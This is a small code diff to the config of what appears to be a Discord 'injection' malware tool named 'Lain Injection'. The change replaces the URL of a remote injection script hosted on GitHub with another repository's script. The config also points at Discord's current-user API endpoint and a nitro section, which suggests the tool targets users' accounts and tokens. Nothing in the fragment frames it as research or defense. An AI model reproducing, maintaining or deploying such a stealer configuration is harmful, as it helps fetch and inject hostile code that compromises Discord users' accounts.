@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Lain Injection', 
   embed_icon: 'https://i.pinimg.com/originals/34/93/79/34937969b29f8b38de58444ffce38bfd.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/fxtazz/injection/main/index.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
